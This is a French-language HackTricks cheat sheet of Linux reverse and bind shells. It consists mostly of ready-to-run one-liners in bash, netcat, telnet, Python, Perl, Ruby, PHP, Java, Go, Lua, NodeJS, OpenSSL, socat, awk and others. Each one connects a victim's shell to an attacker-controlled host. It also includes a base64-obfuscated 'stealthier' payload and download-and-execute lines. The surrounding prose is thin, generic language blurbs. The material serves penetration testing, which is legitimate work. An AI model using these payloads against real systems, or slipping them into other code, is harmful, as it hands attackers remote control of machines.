# Shells - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Si vous avez des questions sur l'un de ces shells, vous pouvez les vérifier avec** [**https://explainshell.com/**](https://explainshell.com)

## TTY complet

**Une fois que vous avez un shell inversé**[ **lisez cette page pour obtenir un TTY complet**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
N'oubliez pas de vérifier avec d'autres shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.

### Shell sûr pour les symboles
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Explication de Shell

1. **`bash -i`**: Cette partie de la commande démarre un shell interactif (`-i`) Bash.
2. **`>&`**: Cette partie de la commande est une notation abrégée pour **rediriger à la fois la sortie standard** (`stdout`) et **l'erreur standard** (`stderr`) vers la **même destination**.
3. **`/dev/tcp/<IP-ATTAQUANT>/<PORT>`**: Il s'agit d'un fichier spécial qui **représente une connexion TCP à l'adresse IP et au port spécifiés**.
   * En **redirigeant les flux de sortie et d'erreur vers ce fichier**, la commande envoie efficacement la sortie de la session de shell interactive à la machine de l'attaquant.
4. **`0>&1`**: Cette partie de la commande **redirige l'entrée standard (`stdin`) vers la même destination que la sortie standard (`stdout`)**.

### Créer un fichier et exécuter
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Shell Avancé

Il peut arriver que vous ayez une **RCE dans une application Web sur une machine Linux**, mais en raison de règles Iptables ou d'autres types de filtrage, **vous ne pouvez pas obtenir de shell inversé**. Ce "shell" vous permet de maintenir un shell PTY via cette RCE en utilisant des pipes à l'intérieur du système victime.\
Vous pouvez trouver le code sur [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Vous devez simplement modifier:

* L'URL de l'hôte vulnérable
* Le préfixe et le suffixe de votre payload (le cas échéant)
* La façon dont la charge utile est envoyée (en-têtes? données? informations supplémentaires?)

Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un PTY complet (notez que les pipes sont lus et écrits avec un délai approximatif de 1,3 seconde).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Vérifiez-le sur [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet est un protocole de communication qui permet d'accéder à une machine distante via le réseau. Il est souvent utilisé pour se connecter à des serveurs distants et exécuter des commandes à distance. Cependant, il est important de noter que Telnet n'est pas sécurisé car les données sont envoyées en clair, ce qui signifie que toute personne capable d'intercepter le trafic réseau peut voir les informations envoyées. Il est donc recommandé d'utiliser SSH à la place de Telnet pour des raisons de sécurité.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Attaquant**
```bash
while true; do nc -l <port>; done
```
Pour envoyer la commande, écrivez-la, appuyez sur Entrée et appuyez sur CTRL+D (pour arrêter STDIN)

**Victime**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python est un langage de programmation interprété de haut niveau, orienté objet et multiplateforme. Il est souvent utilisé pour l'automatisation de tâches, le développement web, l'analyse de données et la création de scripts. Python est également largement utilisé dans le domaine de la sécurité informatique pour l'écriture de scripts d'exploitation et d'outils de test de vulnérabilités. Il est facile à apprendre et dispose d'une grande communauté de développeurs qui contribuent à de nombreux projets open source.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```
## Perl

Perl est un langage de programmation interprété, souvent utilisé pour l'automatisation de tâches système et la manipulation de fichiers. Il est également utilisé dans le développement web pour la création de scripts CGI. Perl est un langage très flexible et puissant, avec une syntaxe concise et expressive. Il est souvent utilisé dans les outils de hacking en raison de sa capacité à manipuler facilement les chaînes de caractères et les expressions régulières.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby est un langage de programmation interprété, orienté objet et dynamique. Il est souvent utilisé pour le développement web et est également populaire dans le domaine de la sécurité informatique en raison de sa flexibilité et de sa facilité d'utilisation. Ruby est souvent utilisé pour écrire des scripts de shell et des outils de piratage.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

## Français

PHP est un langage de script côté serveur populaire pour la création de sites web dynamiques. Il est souvent utilisé en conjonction avec des bases de données pour stocker et récupérer des informations. Les vulnérabilités courantes de PHP incluent les injections SQL, les failles de sécurité de la session et les vulnérabilités de téléchargement de fichiers. Les attaquants peuvent également exploiter des vulnérabilités dans les applications PHP pour exécuter du code malveillant sur le serveur. Il est important de maintenir les versions de PHP à jour et de suivre les meilleures pratiques de sécurité pour minimiser les risques de compromission.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java est un langage de programmation orienté objet populaire utilisé pour développer des applications pour une variété de plates-formes, y compris les ordinateurs de bureau, les serveurs, les téléphones portables et les appareils embarqués. Il est également utilisé pour développer des applications Web et des applications pour les plates-formes cloud. Java est connu pour sa portabilité, sa sécurité et sa fiabilité. Il est souvent utilisé pour développer des applications d'entreprise et des applications pour les services financiers.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat est un utilitaire de ligne de commande qui permet de lire et écrire des données sur des connexions réseau à l'aide de protocoles TCP ou UDP. Il peut être utilisé pour créer des connexions réseau, écouter des ports pour des connexions entrantes et transférer des données entre des connexions. Ncat peut également être utilisé pour créer des tunnels réseau chiffrés à l'aide de SSL ou TLS. Cet outil est très utile pour les tests de pénétration et les activités de hacking.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

Golang est un langage de programmation open source créé par Google en 2007. Il est conçu pour être simple, efficace et facile à apprendre. Golang est souvent utilisé pour développer des applications réseau et des outils de ligne de commande en raison de sa vitesse et de sa capacité à gérer de multiples connexions simultanément. Il est également de plus en plus populaire pour le développement de microservices et d'applications cloud-native en raison de sa facilité de déploiement et de sa faible consommation de ressources.
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua est un langage de programmation léger, rapide et facile à intégrer à d'autres langages. Il est souvent utilisé pour écrire des scripts dans des jeux vidéo et des applications web. Lua est également utilisé comme langage de script pour les serveurs d'applications et les applications embarquées. Il est connu pour sa simplicité, sa flexibilité et sa performance.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS est une plateforme logicielle open-source qui permet d'exécuter du code JavaScript côté serveur. Elle est basée sur le moteur JavaScript V8 de Google et est utilisée pour créer des applications web, des outils en ligne de commande et des serveurs. NodeJS est également utilisé pour créer des applications de type API et pour interagir avec des bases de données.
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

L'attaquant (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
La Victime
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de liaison
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
```
### Shell inversé
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk est un outil de traitement de texte qui permet de manipuler et de transformer des données. Il est souvent utilisé pour extraire des informations d'un fichier texte ou pour effectuer des calculs sur ces données. Awk est un langage de programmation complet avec des structures de contrôle, des fonctions et des tableaux. Il est disponible sur la plupart des systèmes Unix et Linux.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Attaquant**
```bash
while true; do nc -l 79; done
```
Pour envoyer la commande, écrivez-la, appuyez sur Entrée et appuyez sur CTRL+D (pour arrêter STDIN)

**Victime**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk est un outil de traitement de texte qui permet de manipuler des données structurées telles que des fichiers CSV. Il est souvent utilisé pour extraire des informations d'un fichier texte ou pour effectuer des opérations de transformation de données. Gawk est également utile pour automatiser des tâches répétitives telles que la génération de rapports ou la manipulation de fichiers de configuration.
```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```
## Xterm

L'une des formes les plus simples de shell inversé est une session xterm. La commande suivante doit être exécutée sur le serveur. Elle essaiera de se connecter à vous (10.0.0.1) sur le port TCP 6001.
```bash
xterm -display 10.0.0.1:1
```
Pour intercepter le xterm entrant, démarrez un serveur X (:1 - qui écoute sur le port TCP 6001). Une façon de faire cela est avec Xnest (à exécuter sur votre système):
```bash
Xnest :1
```
Vous devrez autoriser la cible à se connecter à vous (la commande est également exécutée sur votre hôte):
```bash
xhost +targetip
```
## Groovy

par [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Le reverse shell Java fonctionne également pour Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Bibliographie

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
